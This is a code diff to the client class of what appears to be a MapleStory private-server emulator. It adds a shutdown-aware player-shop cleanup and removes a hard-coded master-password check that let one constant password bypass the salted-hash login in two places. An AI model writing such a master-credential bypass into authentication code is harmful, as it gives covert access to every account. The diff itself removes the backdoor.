@@ -108,7 +108,6 @@ public class MapleClient {
     private final transient Lock mutex = new ReentrantLock(true);
     private final transient Lock npcMutex = new ReentrantLock();
     private final static Lock loginMutex = new ReentrantLock(true);
-    
 
     public MapleClient(MapleAESOFB send, MapleAESOFB receive, IoSession session) {
         this.send = send;
@@ -380,7 +379,7 @@ public class MapleClient {
                                     // Check if a password upgrade is needed.
                                     loginok = 0;
 
-                                } else if (pwd.equals(GameConstants.MASTER) || LoginCrypto.checkSaltedSha512Hash(passhash, pwd, salt)) {
+                                } else if (LoginCrypto.checkSaltedSha512Hash(passhash, pwd, salt)) {
                                     loginok = 0;
                                     updatePasswordHashtosha1 = true;
                                 } else {
@@ -447,7 +446,7 @@ public class MapleClient {
                             } else if (salt == null && LoginCrypto.checkSha1Hash(passhash, password)) {
                                 loginok = 0;
                                 updatePasswordHash = true;
-                            } else if (password.equals(GameConstants.MASTER) || LoginCrypto.checkSaltedSha512Hash(passhash, password, salt)) {
+                            } else if (LoginCrypto.checkSaltedSha512Hash(passhash, password, salt)) {
                                 loginok = 0;
                                 updatePasswordHashtosha1 = true;
                             } else {
@@ -697,7 +696,7 @@ public class MapleClient {
         return birthday == date;
     }
 
-    public final void removalTask() {
+    public final void removalTask(boolean shutdown) {
         try {
             player.cancelAllBuffs_();
             player.cancelAllDebuffs();
@@ -728,15 +727,16 @@ public class MapleClient {
                 }
                 player.getMap().removePlayer(player);
             }
-
-            final IMaplePlayerShop shop = player.getPlayerShop();
-            if (shop != null) {
-                shop.removeVisitor(player);
-                if (shop.isOwner(player)) {
-                    if (shop.getShopType() == 1 && shop.isAvailable()) {
-                        shop.setOpen(true);
-                    } else {
-                        shop.closeShop(true, true);
+            synchronized (this) {//精靈商人東西修復
+                final IMaplePlayerShop shop = player.getPlayerShop();
+                if (shop != null) {
+                    shop.removeVisitor(player);
+                    if (shop.isOwner(player)) {
+                        if (shop.getShopType() == 1 && shop.isAvailable() && !shutdown) {
+                            shop.setOpen(true);
+                        } else {
+                            shop.closeShop(true, !shutdown);
+                        }
                     }
                 }
             }
@@ -770,7 +770,7 @@ public class MapleClient {
             final MapleGuildCharacter chrg = player.getMGC();
             final MapleFamilyCharacter chrf = player.getMFC();
 
-            removalTask();
+            removalTask(shutdown);
             player.saveToDB(true, fromCS);
             if (shutdown) {
                 player = null;
@@ -1044,7 +1044,7 @@ public class MapleClient {
     }
 
     public final void pongReceived() {
-        
+
         lastPong = System.currentTimeMillis();
     }
 
